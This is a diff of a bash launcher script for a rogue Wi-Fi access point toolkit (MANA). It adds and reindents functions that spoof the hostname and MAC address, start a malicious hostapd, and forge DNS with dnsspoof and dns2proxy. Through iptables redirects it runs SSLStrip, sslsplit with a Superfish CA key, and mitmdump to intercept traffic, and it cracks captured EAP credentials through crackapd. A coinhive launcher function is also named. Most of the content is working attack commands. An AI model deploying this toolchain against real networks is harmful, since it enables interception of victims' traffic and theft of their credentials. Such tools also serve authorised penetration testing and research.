@@ -14,55 +14,51 @@ export ssl_cert_key=$share/crackpkcs8/Superfish_CA.key
 cd $(dirname $0)
 
 check_ap_mode(){
- if ! iw list | grep 'AP$'>/dev/null
-  then
-   echo -e "$txtgrn [*] Cannot find interface supporting: AP-mode!$endclr"
-   echo -e "$txtred  [?] Continue anyway?(y/n)$endclr"
-    read -p "[>]" ans
-     case "$ans" in
-      n|N|no|No|NO) echo -e "$txtred [X] Exiting...$endclr"; exit ;;
-      y|Y|yes|Yes|YES) echo -e "$txtgrn [*] Continuing...$endclr" ;;
-     esac
- fi
+         if ! iw list | grep 'AP$'>/dev/null
+          then
+           echo -e "$txtgrn [*] Cannot find interface supporting: AP-mode!$endclr"
+           echo -e "$txtred  [?] Continue anyway?(y/n)$endclr"
+            read -p "[>]" ans
+             case "$ans" in
+              n|N|no|No|NO) echo -e "$txtred [X] Exiting...$endclr"; exit ;;
+              y|Y|yes|Yes|YES) echo -e "$txtgrn [*] Continuing...$endclr" ;;
+             esac
+         fi
 }
 
 start_hostname(){
-	hostname WRT54G
-	 echo -e "$txtgrn [*] Changed hostname to: WRT54G$endclr"
-	 sleep 2
+    	 hostname WRT54G
+    	  echo -e "$txtgrn [*] Changed hostname to: WRT54G$endclr"
+    	  sleep 2
 }
 
 clearwifi(){
-	service network-manager stop
-    rfkill unblock wlan
-    ifconfig $phy up
+	    service network-manager stop
+        rfkill unblock wlan
+        ifconfig $phy up
 }
 
 start_macchanger(){
- if [ -z $1 ]; then
-  interface=$phy
- else
- interface=$1
- fi
-read -t 3 -p "Changing mac in 3 seconds, type x to skip [>]" ans
-echo ""
- case $ans in
-  x|X) echo -e "\n $txtgrn [*] Skipping macchange.." ;;
-  *) ifconfig "$interface" down; macchanger -r "$interface"; ifconfig "$interface" up ;;
- esac
+        if [ -z $1 ]; then
+         interface=$phy
+        else
+         interface=$1
+        fi
+         read -t 3 -p "Changing mac in 3 seconds, type x to skip [>]" ans
+          echo ""
+        case $ans in
+         x|X) echo -e "\n $txtgrn [*] Skipping macchange.." ;;
+         *) ifconfig "$interface" down; macchanger -r "$interface"; ifconfig "$interface" up ;;
+        esac
 exit
 }
 
 start_hostapd(){
-	sed -i "s/^interface=.*$/interface=$phy/" $conf
-	$hostapd $conf&
-	sleep 5
-	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
-	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
-}
-
-start_dnsmasq(){
-	dnsmasq --bind-interfaces --conf-file=$share/run-mana/conf/dnsmasq-dhcpd.conf --interface=$phy --except-interface=lo #--port=0
+    	sed -i "s/^interface=.*$/interface=$phy/" $conf
+    	$hostapd $conf&
+    	sleep 5
+    	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
+	    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 }
 
 start_nat_firewall(){
@@ -82,12 +78,19 @@ start_sslstrip(){
         iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 }
 
+start_dnsmasq(){
+    	dnsmasq --bind-interfaces --conf-file=$share/run-mana/conf/dnsmasq-dhcpd.conf --interface=$phy --except-interface=lo #--port=0
+}
+
+start_dnsspoof(){
+        dnsspoof -i $phy -f $share/run-mana/conf/dnsspoof.conf&
+}
+
 start_dns2proxy(){
         cd $share/sslstrip-hsts/dns2proxy/
         python dns2proxy.py -i $phy&
         cd -
 }
-
 
 start_sslsplit(){
         sslsplit -D -P -Z -S $loot/sslsplit -c $ssl_cert_pem -k $ssl_cert_key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
@@ -142,13 +145,33 @@ start_msfconsole(){
 }
 
 start_mitmdump(){
-	iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
-	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-	mitmdump --mode transparent
+	    iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
+    	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+    	mitmdump --mode transparent
+}
+
+start_stunnel4(){
+        stunnel4 $share/run-mana/conf/stunnel.conf
+}
+
+start_tinyproxy(){
+        tinyproxy -c $share/run-mana/conf/tinyproxy.conf&
+}
+
+start_crackapd(){
+    # Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
+     crackapd=$share/crackapd/crackapd.py
+     conf=$share/run-mana/conf/hostapd-mana-eap.conf
+     export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
+
+        echo $EXNODE
+        mkfifo $EXNODE
+
+         $crackapd&
 }
 
 start_apache(){
-    service apache2 start
+        service apache2 start
 }
 
 start-coinhive(){
@@ -449,8 +472,9 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [--clearwifi]                - Stop network-manager &rfkill unblock wifi
  Usage: $(basename "$0") [--start_macchanger]         - Change mac
  Usage: $(basename "$0") [--start_hostapd]            - Hostapd - Start modified hostapd that implements new mana attacks
- Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - A lightweight DHCP and caching DNS server
  Usage: $(basename "$0") [--start_sslstrip]           - SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
+ Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - A lightweight DHCP and caching DNS server
+ Usage: $(basename "$0") [--start_dnsspoof]           - dnsspoof - Forge DNS responses for a DNS server on the local network
  Usage: $(basename "$0") [--start_dns2proxy]          - dns2proxy - Offensive DNS server offering various features for post-exploitation once you've changed victims DNS server.
  Usage: $(basename "$0") [--start_sslsplit]           - Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
  Usage: $(basename "$0") [--start_nat_firewall]       - Nat firewall - iptables rules
@@ -460,6 +484,8 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [--start_crackapd]           - Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
  Usage: $(basename "$0") [--start_apache]             - Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
  Usage: $(basename "$0") [--start_mitmdump]           - Mitmdump - A man-in-the-middle proxy with a command-line interface
+ Usage: $(basename "$0") [--start_stunnel4]           - Stunnel4 - Universal SSL tunnel for network daemons
+ Usage: $(basename "$0") [--start_tinyproxy]          - TinyProxy - A light-weight HTTP proxy daemon
 
  Usage: $(basename "$0") [-e] [--edit]   | Edit this file.
  Usage: $(basename "$0") [-h] [--help]   | Print this help.
@@ -492,6 +518,8 @@ for ARG in $@
       --start_netcreds)  	   start_netcreds       ;;
       --start_msfconsole)	   start_msfconsole     ;;
       --start_mitmdump)	       start_mitmdump       ;;
+      --start_stunnel4)	       start_stunnel4       ;;
+      --start_tinyproxy)	   start_tinyproxy      ;;
       --hangon)  		       hangon               ;;
       --killem)  		       killem               ;;
    #Main launchers
